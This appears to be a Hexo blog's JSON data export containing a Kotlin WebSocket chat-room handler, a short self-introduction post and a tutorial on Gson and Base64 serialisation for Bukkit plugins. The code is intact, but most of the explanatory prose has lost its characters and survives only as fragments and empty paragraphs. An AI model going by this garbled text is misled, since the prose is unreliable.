punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        connectedSessions<span class=\"token punctuation\">.</span><span class=\"token function\">remove</span><span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">val</span> username <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>attributes<span class=\"token punctuation\">[</span><span class=\"token string\">\"username\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">?:</span> <span class=\"token string\">\"unnamed\"</span>\n        <span class=\"token keyword\">val</span> avatar <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>attributes<span class=\"token punctuation\">[</span><span class=\"token string\">\"avatar\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">?:</span> <span class=\"token string\">\"https://i0.hdslb.com/bfs/face/member/noface.jpg@240w_240h_1c_1s.webp\"</span>\n        connectedSessions<span class=\"token punctuation\">.</span><span class=\"token function\">forEach</span> <span class=\"token punctuation\">&#123;</span> it<span class=\"token punctuation\">.</span><span class=\"token function\">sendMessage</span><span class=\"token punctuation\">(</span><span class=\"token function\">TextMessage</span><span class=\"token punctuation\">(</span><span class=\"token function\">ChatWsMessageBean</span><span class=\"token punctuation\">(</span>WebSocketMessageType<span class=\"token punctuation\">.</span>CLOSE<span class=\"token punctuation\">,</span> username<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> avatar<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">stringify</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[ChatRoom] <span class=\"token interpolation variable\">$username</span> disconnect with avatar <span class=\"token interpolation variable\">$avatar</span>\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">fun</span> ChatWsMessageBean<span class=\"token punctuation\">.</span><span class=\"token function\">stringify</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> objectMapper<span class=\"token punctuation\">.</span><span class=\"token function\">writeValueAsString</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token annotation builtin\">@Configuration</span>\n<span class=\"token annotation builtin\">@EnableWebSocket</span>\n<span class=\"token keyword\">class</span> WebSocketConfig <span class=\"token operator\">:</span> WebSocketConfigurer <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token annotation builtin\">@Autowired</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">lateinit</span> <span class=\"token keyword\">var</span> chatRoomWsHandler<span class=\"token operator\">:</span> ChatRoomWsHandler\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">registerWebSocketHandlers</span><span class=\"token punctuation\">(</span>registry<span class=\"token operator\">:</span> WebSocketHandlerRegistry<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        registry<span class=\"token punctuation\">.</span><span class=\"token function\">addHandler</span><span class=\"token punctuation\">(</span>chatRoomWsHandler<span class=\"token punctuation\">,</span> <span class=\"token string\">\"chatroom\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">setAllowedOrigins</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"*\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>Android</p>\n<p>XD</p>\n"},{"title":"Hello World","date":"2021-11-07T16:00:00.000Z","author":"","top":true,"hide":false,"summary":"","_content":"# Hello World\n\n> \n\n 2021/11/9 gitbloghexo\n\n\n\n# Self Introduction\n\n> - CQUPT\n> - BukkitMC\n> - KotlinKotlinJava\n> - /Web \n\n","source":"_posts/hello-world.md","raw":"---\ntitle: Hello World\ndate: 2021-11-08\nauthor: \ntop: true\nhide: false\nsummary: \ncategories: \n---\n# Hello World\n\n> \n\n 2021/11/9 gitbloghexo\n\n\n\n# Self Introduction\n\n> - CQUPT\n> - BukkitMC\n> - KotlinKotlinJava\n> - /Web \n\n","slug":"hello-world","published":1,"updated":"2022-11-24T02:58:01.944Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jtj001csfkl45gq6z40","content":"<h1 id=\"Hello-World\"><a href=\"#Hello-World\" class=\"headerlink\" title=\"Hello World\"></a>Hello World</h1><blockquote>\n<p></p>\n</blockquote>\n<p> 2021/11/9 gitbloghexo</p>\n<p></p>\n<h1 id=\"Self-Introduction\"><a href=\"#Self-Introduction\" class=\"headerlink\" title=\"Self Introduction\"></a>Self Introduction</h1><blockquote>\n<ul>\n<li>CQUPT</li>\n<li>BukkitMC</li>\n<li>KotlinKotlinJava</li>\n<li>/Web </li>\n</ul>\n</blockquote>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":""},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go","url":"https://blog.stellaris.wang/","title":""}]}},"excerpt":"","more":"<h1 id=\"Hello-World\"><a href=\"#Hello-World\" class=\"headerlink\" title=\"Hello World\"></a>Hello World</h1><blockquote>\n<p></p>\n</blockquote>\n<p> 2021&#x2F;11&#x2F;9 gitbloghexo</p>\n<p></p>\n<h1 id=\"Self-Introduction\"><a href=\"#Self-Introduction\" class=\"headerlink\" title=\"Self Introduction\"></a>Self Introduction</h1><blockquote>\n<ul>\n<li>CQUPT</li>\n<li>BukkitMC</li>\n<li>KotlinKotlinJava</li>\n<li>&#x2F;Web </li>\n</ul>\n</blockquote>\n"},{"title":"","date":"2021-07-20T15:52:12.000Z","author":"","hide":false,"summary":"Java/Kotlin","_content":"\n**json****base64**\n\n## Json\n\nJson****\n\n**gson****fastjson**\n\ngsonSpigotgson\n\ngson\n\n/\n\n```kotlin\n// \nval string: String = Gson().toJson(instance)\n// \nval obj: Any = Gson().fromJson(string, Any::class.java)\n// \nval str: String = Gson().toJson(arrayListOf(\"1\",\"2\"))\nval list: ArrayList<String> = Gson().fromJson(str,object : TypeToken<ArrayList<String>>{}.type)\n```\n\n\n\ngsonMapgson\n\n\n\n{}**NullPointerException**\n\n\n\n**Kotlin**\n\n\n\n**GsonGson**\n\n\n\n```kotlin\n//  TabooLib io.izzel.taboolib.kotlin.Serializer\n// TypeHierarchAdapter\n    val gson = GsonBuilder().setPrettyPrinting().excludeFieldsWithoutExposeAnnotation().also {\n        it.registerTypeHierarchyAdapter(Location::class.java, TypeLocation())\n        it.registerTypeHierarchyAdapter(ItemStack::class.java, TypeItemStack())\n        it.registerTypeHierarchyAdapter(SecuredFile::class.java, TypeSecuredFile())\n        it.registerTypeHierarchyAdapter(YamlConfiguration::class.java, TypeYamlConfiguration())\n        SerializerAdapter.map.forEach { (k, v) ->\n            it.registerTypeHierarchyAdapter(k, v)\n        }\n    }.create()!!\n\n// TypeAdapter\n// LocationTypeAdapter\n    class TypeLocation : JsonSerializer<Location>, JsonDeserializer<Location> {\n\n        override fun serialize(a: Location, p1: Type, p2: JsonSerializationContext): JsonElement {\n            return JsonObject().also {\n                it.addProperty(\"world\", a.world!!.name)\n                it.addProperty(\"x\", a.x)\n                it.addProperty(\"y\", a.y)\n                it.addProperty(\"z\", a.z)\n                it.addProperty(\"yaw\", a.yaw)\n                it.addProperty(\"pitch\", a.pitch)\n            }\n        }\n\n        override fun deserialize(a: JsonElement, p1: Type?, p2: JsonDeserializationContext): Location {\n            return Location(\n                Bukkit.getWorld(a.asJsonObject.get(\"world\").asString),\n                a.asJsonObject.get(\"x\").asDouble,\n                a.asJsonObject.get(\"y\").asDouble,\n                a.asJsonObject.get(\"z\").asDouble,\n                a.asJsonObject.get(\"yaw\").asFloat,\n                a.asJsonObject.get(\"pitch\").asFloat\n            )\n        }\n    }\n\n\n```\n\nGsonBuilderAdapterGson/\n\n\n\n\n\n**Base64**\n\n## Base64\n\nbase64gson/\n\nJavaBase64\n\n**Json**\n\n\n\nSQL\n\n\n\n```kotlin\n// SacredHUD\n// Base64 encode\nfun HashMap<String, BitMapData.Personal>.toBase64(): String {\n    ByteArrayOutputStream().use { byteArrayOutputStream ->\n        BukkitObjectOutputStream(byteArrayOutputStream).use { bukkitObjectOutputStream ->\n            bukkitObjectOutputStream.writeObject(this)\n            return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray())\n        }\n    }\n}\n\n// Base64 decode\n@Suppress(\"UNCHECKED_CAST\")\nfun String.base64ToBitmapData(): HashMap<String, BitMapData.Personal> {\n    ByteArrayInputStream(Base64.getDecoder().decode(this)).use { byteArrayInputStream ->\n        BukkitObjectInputStream(byteArrayInputStream).use { bukkitObjectInputStream ->\n            return bukkitObjectInputStream.readObject() as HashMap<String, BitMapData.Personal>\n        }\n    }\n}\n```","source":"_posts/how-to-serialize.md","raw":"---\ntitle: \ndate: 2021-07-20 23:52:12\nauthor: \nhide: false\nsummary: Java/Kotlin\ncategories: \ntags:\n  - Kotlin\n  - Java\n  - \n---\n\n**json****base64**\n\n## Json\n\nJson****\n\n**gson****fastjson**\n\ngsonSpigotgson\n\ngson\n\n/\n\n```kotlin\n// \nval string: String = Gson().toJson(instance)\n// \nval obj: Any = Gson().fromJson(string, Any::class.java)\n// \nval str: String = Gson().toJson(arrayListOf(\"1\",\"2\"))\nval list: ArrayList<String> = Gson().fromJson(str,object : TypeToken<ArrayList<String>>{}.type)\n```\n\n\n\ngsonMapgson\n\n\n\n{}**NullPointerException**\n\n\n\n**Kotlin**\n\n\n\n**GsonGson**\n\n\n\n```kotlin\n//  TabooLib io.izzel.taboolib.kotlin.Serializer\n// TypeHierarchAdapter\n    val gson = GsonBuilder().setPrettyPrinting().excludeFieldsWithoutExposeAnnotation().also {\n        it.registerTypeHierarchyAdapter(Location::class.java, TypeLocation())\n        it.registerTypeHierarchyAdapter(ItemStack::class.java, TypeItemStack())\n        it.registerTypeHierarchyAdapter(SecuredFile::class.java, TypeSecuredFile())\n        it.registerTypeHierarchyAdapter(YamlConfiguration::class.java, TypeYamlConfiguration())\n        SerializerAdapter.map.forEach { (k, v) ->\n            it.registerTypeHierarchyAdapter(k, v)\n        }\n    }.create()!!\n\n// TypeAdapter\n// LocationTypeAdapter\n    class TypeLocation : JsonSerializer<Location>, JsonDeserializer<Location> {\n\n        override fun serialize(a: Location, p1: Type, p2: JsonSerializationContext): JsonElement {\n            return JsonObject().also {\n                it.addProperty(\"world\", a.world!!.name)\n                it.addProperty(\"x\", a.x)\n                it.addProperty(\"y\", a.y)\n                it.addProperty(\"z\", a.z)\n                it.addProperty(\"yaw\", a.yaw)\n                it.addProperty(\"pitch\", a.pitch)\n            }\n        }\n\n        override fun deserialize(a: JsonElement, p1: Type?, p2: JsonDeserializationContext): Location {\n            return Location(\n                Bukkit.getWorld(a.asJsonObject.get(\"world\").asString),\n                a.asJsonObject.get(\"x\").asDouble,\n                a.asJsonObject.get(\"y\").asDouble,\n                a.asJsonObject.get(\"z\").asDouble,\n                a.asJsonObject.get(\"yaw\").asFloat,\n                a.asJsonObject.get(\"pitch\").asFloat\n            )\n        }\n    }\n\n\n```\n\nGsonBuilderAdapterGson/\n\n\n\n\n\n**Base64**\n\n## Base64\n\nbase64gson/\n\nJavaBase64\n\n**Json**\n\n\n\nSQL\n\n\n\n```kotlin\n// SacredHUD\n// Base64 encode\nfun HashMap<String, BitMapData.Personal>.toBase64(): String {\n    ByteArrayOutputStream().use { byteArrayOutputStream ->\n        BukkitObjectOutputStream(byteArrayOutputStream).use { bukkitObjectOutputStream ->\n            bukkitObjectOutputStream.writeObject(this)\n            return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray())\n        }\n    }\n}\n\n// Base64 decode\n@Suppress(\"UNCHECKED_CAST\")\nfun String.base64ToBitmapData(): HashMap<String, BitMapData.Personal> {\n    ByteArrayInputStream(Base64.getDecoder().decode(this)).use { byteArrayInputStream ->\n        BukkitObjectInputStream(byteArrayInputStream).use { bukkitObjectInputStream ->\n            return bukkitObjectInputStream.readObject() as HashMap<String, BitMapData.Personal>\n        }\n    }\n}\n```","slug":"how-to-serialize","published":1,"updated":"2021-11-13T16:17:16.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jtj001fsfklbdd82igs","content":"<p><strong>json</strong><strong>base64</strong></p>\n<h2 id=\"Json\"><a href=\"#Json\" class=\"headerlink\" title=\"Json\"></a>Json</h2><p>Json<strong></strong></p>\n<p><strong>gson</strong><strong>fastjson</strong></p>\n<p>gsonSpigotgson</p>\n<p>gson</p>\n<p>/</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token comment\">// </span>\n<span class=\"token keyword\">val</span> string<span class=\"token operator\">:</span> String <span class=\"token operator\">=</span> <span class=\"token function\">Gson</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toJson</span><span class=\"token punctuation\">(</span>instance<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">// </span>\n<span class=\"token keyword\">val</span> obj<span class=\"token operator\">:</span> Any <span class=\"token operator\">=</span> <span class=\"token function\">Gson</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">fromJson</span><span class=\"token punctuation\">(</span>string<span class=\"token punctuation\">,</span> Any<span class=\"token operator\">::</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span>java<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">// </span>\n<span class=\"token keyword\">val</span> str<span class=\"token operator\">:</span> String <span class=\"token operator\">=</span> <span class=\"token function\">Gson</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toJson</span><span class=\"token punctuation\">(</span><span class=\"token function\">arrayListOf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"2\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">val</span> list<span class=\"token operator\">:</span> ArrayList<span class=\"token operator\">&lt;</span>String<span class=\"token operator\">&gt;</span> <span class=\"token operator\">=</span> <span class=\"token function\">Gson</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">fromJson</span><span class=\"token punctuation\">(</span>str<span class=\"token punctuation\">,</span><span class=\"token keyword\">object</span> <span class=\"token operator\">:</span> TypeToken<span class=\"token operator\">&lt;</span>ArrayList<span class=\"token operator\">&lt;</span>String<span class=\"token operator\">&gt;</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">.</span>type<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<p>gsonMapgson</p>\n<p></p>\n<p>{}<strong>NullPointerException</strong></p>\n<p></p>\n<p><strong>Kotlin</strong></p>\n<p></p>\n<p><strong>GsonGson</strong></p>\n<p></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token comment\">//  TabooLib io.izzel.taboolib.kotlin.Serializer</span>\n<span class=\"token comment\">// TypeHierarchAdapter</span>\n    <span class=\"token keyword\">val</span> gson <span class=\"token operator\">=</span> <span class=\"token function\">GsonBuilder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">setPrettyPrinting</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">excludeFieldsWithoutExposeAnnotation</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">also</span> <span class=\"token punctuation\">{</span>\n        it<span class=\"token punctuation\">.</span><span class=\"token function\">registerTypeHierarchyAdapter</span><span class=\"token punctuation\">(</span>Location<span class=\"token operator\">::</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span>java<span class=\"token punctuation\">,</span> <span class=\"token function\">TypeLocation</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        it<span class=\"token punctuation\">.</span><span class=\"token function\">registerTypeHierarchyAdapter</span><span class=\"token punctuation\">(</span>ItemStack<span class=\"token operator\">::</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span>java<span class=\"token punctuation\">,</span> <span class=\"token function\">TypeItemStack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        it<span class=\"token punctuation\">.</span><span class=\"token function\">registerTypeHierarchyAdapter</span><span class=\"token punctuation\">(</span>SecuredFile<span class=\"token operator\">::</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span>java<span class=\"token punctuation\">,</span> <span class=\"token function\">TypeSecuredFile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        it<span class=\"token punctuation\">.</span><span class=\"token function\">registerTypeHierarchyAdapter</span><span class=\"token punctuation\">(</span>YamlConfiguration<span class=\"token operator\">::</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span>java<span class=\"token punctuation\">,</span> <span class=\"token function\">TypeYamlConfiguration</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        SerializerAdapter<span class=\"token punctuation\">.</span>map<span class=\"token punctuation\">.</span><span class=\"token function\">forEach</span> <span class=\"token punctuation\">{</span> <span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">)</span> <span class=\"token operator\">-&gt;</span>\n            it<span class=\"token punctuation\">.</span><span class=\"token function\">registerTypeHierarchyAdapter</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">.</span><span class=\"token function\">create</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!!</span>\n\n<span class=\"token comment\">// TypeAdapter</span>\n<span class=\"token comment\">// LocationTypeAdapter</span>\n    <span class=\"token keyword\">class</span> TypeLocation <span class=\"token operator\">:</span> JsonSerializer<span class=\"token operator\">&lt;</span>Location<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">,</span> JsonDeserializer<span class=\"token operator\">&lt;</span>Location<span class=\"token operator\">&gt;</span> <span class=\"token punctuation\">{</span>\n\n        <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span>a<span class=\"token operator\">:</span> Location<span class=\"token punctuation\">,</span> p1<span class=\"token operator\">:</span> Type<span class=\"token punctuation\">,</span> p2<span class=\"token operator\">:</span> JsonSerializationContext<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> JsonElement <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">return</span> <span class=\"token function\">JsonObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">also</span> <span class=\"token punctuation\">{</span>\n                it<span class=\"token punctuation\">.</span><span class=\"token function\">addProperty</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"world\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">.</span>world<span class=\"token operator\">!!</span><span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span>\n                it<span class=\"token punctuation\">.</span><span class=\"token function\">addProperty</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"x\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">.</span>x<span class=\"token punctuation\">)</span>\n                it<span class=\"token punctuation\">.</span><span class=\"token function\">addProperty</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"y\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">.</span>y<span class=\"token punctuation\">)</span>\n                it<span class=\"token punctuation\">.</span><span class=\"token function\">addProperty</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"z\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">.</span>z<span class=\"token punctuation\">)</span>\n                it<span class=\"token punctuation\">.</span><span class=\"token function\">addProperty</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"yaw\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">.</span>yaw<span class=\"token punctuation\">)</span>\n                it<span class=\"token punctuation\">.</span><span class=\"token function\">addProperty</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"pitch\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">.</span>pitch<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n\n        <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">deserialize</span><span class=\"token punctuation\">(</span>a<span class=\"token operator\">:</span> JsonElement<span class=\"token punctuation\">,</span> p1<span class=\"token operator\">:</span> Type<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> p2<span class=\"token operator\">:</span> JsonDeserializationContext<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Location <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">return</span> <span class=\"token function\">Location</span><span class=\"token punctuation\">(</span>\n                Bukkit<span class=\"token punctuation\">.</span><span class=\"token function\">getWorld</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">.</span>asJsonObject<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"world\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>asString<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                a<span class=\"token punctuation\">.</span>asJsonObject<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"x\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>asDouble<span class=\"token punctuation\">,</span>\n                a<span class=\"token punctuation\">.</span>asJsonObject<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"y\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>asDouble<span class=\"token punctuation\">,</span>\n                a<span class=\"token punctuation\">.</span>asJsonObject<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"z\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>asDouble<span class=\"token punctuation\">,</span>\n                a<span class=\"token punctuation\">.</span>asJsonObject<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"yaw\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>asFloat<span class=\"token punctuation\">,</span>\n                a<span class=\"token punctuation\">.</span>asJsonObject<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"pitch\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>asFloat\n            <span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>GsonBuilderAdapterGson/</p>\n<p></p>\n<p></p>\n<p><strong>Base64</strong></p>\n<h2 id=\"Base64\"><a href=\"#Base64\" class=\"headerlink\" title=\"Base64\"></a>Base64</h2><p>base64gson/</p>\n<p>JavaBase64</p>\n<p><strong>Json</strong></p>\n<p></p>\n<p>SQL</p>\n<p></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token comment\">// SacredHUD</span>\n<span class=\"token comment\">// Base64 encode</span>\n<span class=\"token keyword\">fun</span> HashMap<span class=\"token operator\">&lt;</span>String<span class=\"token punctuation\">,</span> BitMapData<span class=\"token punctuation\">.</span>Personal<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">.</span><span class=\"token function\">toBase64</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> String <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">ByteArrayOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">use</span> <span class=\"token punctuation\">{</span> byteArrayOutputStream <span class=\"token operator\">-&gt;</span>\n        <span class=\"token function\">BukkitObjectOutputStream</span><span class=\"token punctuation\">(</span>byteArrayOutputStream<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">use</span> <span class=\"token punctuation\">{</span> bukkitObjectOutputStream <span class=\"token operator\">-&gt;</span>\n            bukkitObjectOutputStream<span class=\"token punctuation\">.</span><span class=\"token function\">writeObject</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span> Base64<span class=\"token punctuation\">.</span><span class=\"token function\">getEncoder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">encodeToString</span><span class=\"token punctuation\">(</span>byteArrayOutputStream<span class=\"token punctuation\">.</span><span class=\"token function\">toByteArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// Base64 decode</span>\n<span class=\"token annotation builtin\">@Suppress</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"UNCHECKED_CAST\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">fun</span> String<span class=\"token punctuation\">.</span><span class=\"token function\">base64ToBitmapData</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> HashMap<span class=\"token operator\">&lt;</span>String<span class=\"token punctuation\">,</span> BitMapData<span class=\"token punctuation\">.</span>Personal<span class=\"token operator\">&gt;</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">ByteArrayInputStream</span><span class=\"token punctuation\">(</span>Base64<span class=\"token punctuation\">.</span><span class=\"token function\">getDecoder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">decode</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">use</span> <span class=\"token punctuation\">{</span> byteArrayInputStream <span class=\"token operator\">-&gt;</span>\n        <span class=\"token function\">BukkitObjectInputStream</span><span class=\"token punctuation\">(</span>byteArrayInputStream<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">use</span> <span class=\"token punctuation\">{</span> bukkitObjectInputStream <span class=\"token operator\">-&gt;</span>\n            <span class=\"token keyword\">return</span> bukkitObjectInputStream<span class=\"token punctuation\">.</span><span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> HashMap<span class=\"token operator\">&lt;</span>String<span class=\"token punctuation\">,</span> BitMapData<span class=\"token punctuation\">.</span>Personal<span class=\"token operator\">&gt;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":""},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in 